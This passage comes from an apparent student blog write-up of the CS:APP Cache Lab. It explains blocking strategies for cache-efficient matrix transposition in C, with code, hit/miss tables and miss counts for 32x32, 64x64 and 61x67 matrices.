-250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(1028,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(1528,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="mo" transform="translate(1806,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(2084,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(2584,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container></span>. What if we do not need to update
the cache? In other words, the cache always stores data from matrix
<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container></span>. To this end, we can make use of
local variables to store one block of integers from matrix <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container></span>. Tne cache will only get updated when
we first load data into local variables. Later, the cache will be
overwritten by matrix <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container></span> and will
keep as it is.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], B[M][N])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">if</span> (M == <span class="number">32</span> &amp;&amp; N == <span class="number">32</span>)</span><br><span class="line">  {</span><br><span class="line">      <span class="type">int</span> i, j, block_i, block_j;</span><br><span class="line">      <span class="type">int</span> Temp[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>)</span><br><span class="line">          <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>)</span><br><span class="line">              <span class="keyword">for</span> (block_i = i; block_i &lt; i + <span class="number">8</span>; ++block_i) {</span><br><span class="line">                  <span class="comment">// Load current block of A into local variables</span></span><br><span class="line">                  <span class="keyword">for</span> (block_j = j; block_j &lt; j + <span class="number">8</span>; ++block_j) {</span><br><span class="line">                      Temp[block_j - j] = A[block_i][block_j];</span><br><span class="line">                  }</span><br><span class="line">                  <span class="comment">// Write from locals into B</span></span><br><span class="line">                  <span class="keyword">for</span> (block_j = j; block_j &lt; j + <span class="number">8</span>; ++block_j) {</span><br><span class="line">                      B[block_j][block_i] = Temp[block_j - j];</span><br><span class="line">                  }</span><br><span class="line">              }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (M == <span class="number">64</span> &amp;&amp; N == <span class="number">64</span>) </span><br><span class="line">  {</span><br><span class="line">    </span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line"></span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>This time we get 290 misses! Full score!</p>
<p>The key idea here is to improve temporal locality as much as
possible. To improve temporal locality, we need to try to visit data
within a cache block within as much as we can. Blocking helps with this.
On the other side, we must reduce the number of times of cache
overwriting. Local variables help with this.</p>
<p>Unfortunately, when we have <code>M=N=64</code> using the same code,
the number of cache misses is... <strong>4614</strong>. What the f is
going on? Well, let's revist the cache layout pattern for a
<code>64*64</code> matrix.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> ---------------------------------------</span><br><span class="line">| 0  | 1  | 2  | 3  | 4  | 5  | 6  | 7  | row 1</span><br><span class="line"> ---------------------------------------</span><br><span class="line">| 8  | 9  | 10 | 11 | 12 | 13 | 14 | 15 | row 2</span><br><span class="line"> ---------------------------------------</span><br><span class="line">| 16 | 17 | 18 | 19 | 20 | 21 | 22 | 23 | row 3</span><br><span class="line"> ---------------------------------------</span><br><span class="line">| 24 | 25 | 26 | 27 | 28 | 29 | 30 | 31 | row 4</span><br><span class="line"> ---------------------------------------</span><br><span class="line">| 0  | 1  | 2  | 3  | 4  | 5  | 6  | 7  | row 5</span><br><span class="line"> ---------------------------------------</span><br><span class="line">| 8  | 9  | 10 | 11 | 12 | 13 | 14 | 15 | row 6</span><br><span class="line"> ---------------------------------------</span><br><span class="line">| 16 | 17 | 18 | 19 | 20 | 21 | 22 | 23 | row 7</span><br><span class="line"> ---------------------------------------</span><br><span class="line">| 24 | 25 | 26 | 27 | 28 | 29 | 30 | 31 | row 8</span><br><span class="line"> ---------------------------------------</span><br><span class="line"> .......................................</span><br><span class="line"> ---------------------------------------</span><br><span class="line">| 0  | 1  | 2  | 3  | 4  | 5  | 6  | 7  | row 61</span><br><span class="line"> ---------------------------------------</span><br><span class="line">| 8  | 9  | 10 | 11 | 12 | 13 | 14 | 15 | row 62</span><br><span class="line"> ---------------------------------------</span><br><span class="line">| 16 | 17 | 18 | 19 | 20 | 21 | 22 | 23 | row 63</span><br><span class="line"> ---------------------------------------</span><br><span class="line">| 24 | 25 | 26 | 27 | 28 | 29 | 30 | 31 | row 64</span><br><span class="line"> ---------------------------------------</span><br></pre></td></tr></table></figure>
<p>The diagram shows that <code>8*8</code> blocking only leverages 4
distinct caches and repeats every 4 rows. Let's see how it works when we
use <code>8*8</code> blocking.</p>
<table>
<colgroup>
<col style="width: 17%">
<col style="width: 17%">
<col style="width: 17%">
<col style="width: 14%">
<col style="width: 17%">
<col style="width: 17%">
</colgroup>
<thead>
<tr class="header">
<th>A Read</th>
<th>Cache Set</th>
<th>Miss or Hit</th>
<th>B Write</th>
<th>Cache Set</th>
<th>Miss or Hit</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>A[0][0]</td>
<td>0</td>
<td>M</td>
<td>B[0][0]</td>
<td>0</td>
<td>M</td>
</tr>
<tr class="even">
<td>A[0][1]</td>
<td>0</td>
<td>M</td>
<td>B[1][0]</td>
<td>8</td>
<td>M</td>
</tr>
<tr class="odd">
<td>A[0][2]</td>
<td>0</td>
<td>H</td>
<td>B[2][0]</td>
<td>16</td>
<td>M</td>
</tr>
<tr class="even">
<td>A[0][3]</td>
<td>0</td>
<td>H</td>
<td>B[3][0]</td>
<td>24</td>
<td>M</td>
</tr>
<tr class="odd">
<td>A[0][4]</td>
<td>0</td>
<td>H</td>
<td>B[4][0]</td>
<td>0</td>
<td>M</td>
</tr>
<tr class="even">
<td>A[0][5]</td>
<td>0</td>
<td>M</td>
<td>B[5][0]</td>
<td>8</td>
<td>M</td>
</tr>
<tr class="odd">
<td>A[0][6]</td>
<td>0</td>
<td>H</td>
<td>B[6][0]</td>
<td>16</td>
<td>M</td>
</tr>
<tr class="even">
<td>A[0][7]</td>
<td>0</td>
<td>H</td>
<td>B[7][0]</td>
<td>24</td>
<td>M</td>
</tr>
</tbody>
</table>
<p>Obviously the biggest problem is when we write the last 4 rows of
matrix <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container></span>, we overwrite the
previously loaded blocks, i.e., row 0 to row 3. In this case, writes to
matrix <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container></span> will have a miss rate of
100%.</p>
<p>What about using a <code>8*8</code> blocking strategy? Let's look at
it!</p>
<table>
<colgroup>
<col style="width: 17%">
<col style="width: 17%">
<col style="width: 17%">
<col style="width: 14%">
<col style="width: 17%">
<col style="width: 17%">
</colgroup>
<thead>
<tr class="header">
<th>A Read</th>
<th>Cache Set</th>
<th>Miss or Hit</th>
<th>B Write</th>
<th>Cache Set</th>
<th>Miss or Hit</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>A[0][0]</td>
<td>0</td>
<td>M</td>
<td>B[0][0]</td>
<td>0</td>
<td>M</td>
</tr>
<tr class="even">
<td>A[0][1]</td>
<td>0</td>
<td>M</td>
<td>B[1][0]</td>
<td>8</td>
<td>M</td>
</tr>
<tr class="odd">
<td>A[0][2]</td>
<td>0</td>
<td>H</td>
<td>B[2][0]</td>
<td>16</td>
<td>M</td>
</tr>
<tr class="even">
<td>A[0][3]</td>
<td>0</td>
<td>H</td>
<td>B[3][0]</td>
<td>24</td>
<td>M</td>
</tr>
<tr class="odd">
<td>A[1][0]</td>
<td>8</td>
<td>M</td>
<td>B[0][1]</td>
<td>0</td>
<td>M</td>
</tr>
<tr class="even">
<td>A[1][1]</td>
<td>8</td>
<td>H</td>
<td>B[1][1]</td>
<td>8</td>
<td>M</td>
</tr>
<tr class="odd">
<td>A[1][2]</td>
<td>8</td>
<td>M</td>
<td>B[2][1]</td>
<td>16</td>
<td>H</td>
</tr>
<tr class="even">
<td>A[1][3]</td>
<td>8</td>
<td>H</td>
<td>B[3][1]</td>
<td>24</td>
<td>H</td>
</tr>
<tr class="odd">
<td>A[2][0]</td>
<td>16</td>
<td>M</td>
<td>B[0][2]</td>
<td>0</td>
<td>H</td>
</tr>
<tr class="even">
<td>A[2][1]</td>
<td>16</td>
<td>H</td>
<td>B[1][2]</td>
<td>8</td>
<td>M</td>
</tr>
<tr class="odd">
<td>A[2][2]</td>
<td>16</td>
<td>H</td>
<td>B[2][2]</td>
<td>16</td>
<td>M</td>
</tr>
<tr class="even">
<td>A[2][3]</td>
<td>16</td>
<td>M</td>
<td>B[3][2]</td>
<td>24</td>
<td>H</td>
</tr>
<tr class="odd">
<td>A[3][0]</td>
<td>24</td>
<td>M</td>
<td>B[0][3]</td>
<td>0</td>
<td>H</td>
</tr>
<tr class="even">
<td>A[3][1]</td>
<td>24</td>
<td>H</td>
<td>B[1][3]</td>
<td>8</td>
<td>H</td>
</tr>
<tr class="odd">
<td>A[3][2]</td>
<td>24</td>
<td>H</td>
<td>B[2][3]</td>
<td>16</td>
<td>M</td>
</tr>
<tr class="even">
<td>A[3][3]</td>
<td>24</td>
<td>H</td>
<td>B[3][3]</td>
<td>24</td>
<td>M</td>
</tr>
</tbody>
</table>
<p>Awesome! We significantly improved the miss rate. However... the new
code produces caches misses 1702, which is still beyond our goal 1300.
This is because we're only using 4 integers per block, and results in a
50% waste of the block size. We'd like to combine reading 8 integers
each time and making full use of them to construct <code>4*4</code>
matrices.</p>
<p>In order to do this, we still load each 8 integers for each block
(i.e., each row of matrix <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container></span>) into
local variables. Then we only use 4 of each time, and store the rest 4
integers somewhere else. Where should we place the remaining 4 integers?
Recall the cache layout for a <code>64*64</code> matrix: if we divide
the <code>8*8</code> blocking into 4 sub-blocks, each of which is
<code>4*4</code>, we will be able to place the remaining four integers
in the adjacent sub-block, in the same order the first 4 integers are
written into <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container></span> to avoid cache
conflict.</p>
<p>Maybe it's bettet to take a look at the code below:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i, j, block_i, block_j;</span><br><span class="line"><span class="type">int</span> Temp[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j +=<span class="number">8</span>) {</span><br><span class="line">        <span class="comment">// 1. For first four rows of A</span></span><br><span class="line">        <span class="keyword">for</span> (block_i = i; block_i &lt; i + <span class="number">4</span>; ++block_i) {</span><br><span class="line">            <span class="comment">// 2. Load full cache block -- 8 integers into local vars</span></span><br><span class="line">            <span class="keyword">for</span> (block_j = j; block_j &lt; j + <span class="number">8</span>; ++block_j) {</span><br><span class="line">                Temp[block_j - j] = A[block_i][block_j];</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">// 3. Fill the top-left 4*4 sub-block</span></span><br><span class="line">            <span class="keyword">for</span> (block_j = j; block_j &lt; j + <span class="number">4</span>; ++block_j) {</span><br><span class="line">                B[block_j][block_i] = Temp[block_j - j];</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">// 4. Store the rest four integers into the top-right 4*4 sub-block</span></span><br><span class="line">            <span class="comment">// so that we avoid cache conflict</span></span><br><span class="line">            <span class="keyword">for</span> (block_j = j; block_j &lt; j + <span class="number">4</span>; ++block_j) {</span><br><span class="line">                B[block_j][block_i + <span class="number">4</span>] = Temp[block_j - j + <span class="number">4</span>];</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// 5. For the remaining four rows of A</span></span><br><span class="line">        <span class="keyword">for</span> (block_i = i + <span class="number">4</span>; block_i &lt; i + <span class="number">8</span>; ++block_i) {</span><br><span class="line">            <span class="comment">// 6. Load from the top-right sub-block into local vars by row, no cache conflict</span></span><br><span class="line">            <span class="keyword">for</span> (block_j = i + <span class="number">4</span>; block_j &lt; i + <span class="number">8</span>; ++block_j) {</span><br><span class="line">                Temp[block_j - i - <span class="number">4</span>] = B[j + block_i - i - <span class="number">4</span>][block_j];</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">// 7. Fill the top-right sub-block by row</span></span><br><span class="line">            <span class="keyword">for</span> (block_j = i + <span class="number">4</span>; block_j &lt; i + <span class="number">8</span>; ++block_j) {</span><br><span class="line">                B[j + block_i - i - <span class="number">4</span>][block_j] = A[block_j][j + block_i - i - <span class="number">4</span>];</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">// 8. Fill the bottom-left sub-block by row</span></span><br><span class="line">            <span class="keyword">for</span> (block_j = i; block_j &lt; i + <span class="number">4</span>; ++block_j) {</span><br><span class="line">                B[j + block_i - i][block_j] = Temp[block_j - i];</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">// 9. Fill the bottom-right sub-block by row</span></span><br><span class="line">            <span class="keyword">for</span> (block_j = i + <span class="number">4</span>; block_j &lt; i + <span class="number">8</span>; ++block_j) {</span><br><span class="line">                B[j + block_i - i][block_j] = A[block_j][j + block_i - i];</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></table></figure>
<p>We are always operating on a <code>4*4</code> sub-block each time
switching between matrix <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container></span> and
<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container></span>. By storing by row instead of by
column, we can minimize the number of conflict misses at each iteration.
There are 19 misses for each <code>8*8</code> blocks, and the total
number of misses is <code>19*64=1216</code>. Full score!</p>
<p>For the last problem, note that <code>61</code> and <code>67</code>
are both prime numbers, so the cache layout for this matrix is
irregular. For this reason, we simply adopt standard blocking. The
remaining question is, what's the blocking's size? Just fail and
try!</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i, j, block_i, block_j;</span><br><span class="line"><span class="type">int</span> Temp[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i += <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">56</span>; j += <span class="number">8</span>) {</span><br><span class="line">        <span class="keyword">for</span> (block_i = i; block_i &lt; i + <span class="number">16</span>; ++block_i) {</span><br><span class="line">            <span class="keyword">for</span> (block_j = j; block_j &lt; j + <span class="number">8</span>; ++block_j) {</span><br><span class="line">                Temp[block_j - j] = A[block_i][block_j];</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">for</span> (block_j = j; block_j &lt; j + <span class="number">8</span>; ++block_j) {</span><br><span class="line">                B[block_j][block_i] = Temp[block_j - j];</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">64</span>; i &lt; <span class="number">67</span>; ++i)</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">61</span>; ++j) {</span><br><span class="line">        B[j][i] = A[i][j];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; ++i)</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">56</span>; j &lt; <span class="number">61</span>; ++j) {</span><br><span class="line">        B[j][i] = A[i][j];</span><br><span class="line">    }</span><br></pre></td></tr></table></figure>
<p>We use <code>16*8</code> blocking and the miss count is 1907.</p>
<h1 id="lab-6-performance-lab">Lab 6: Performance Lab</h1>
<h1 id="lab-7-shell-lab">Lab 7: Shell Lab</h1>
<h1 id="lab-8-malloc-lab">Lab 8: Malloc Lab</h1>
<h1 id="lab-9-proxy-lab">Lab 9: Proxy Lab</h1>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/categories/">Categories</a></li>
        
          <li><a href="/resources/">Resources</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
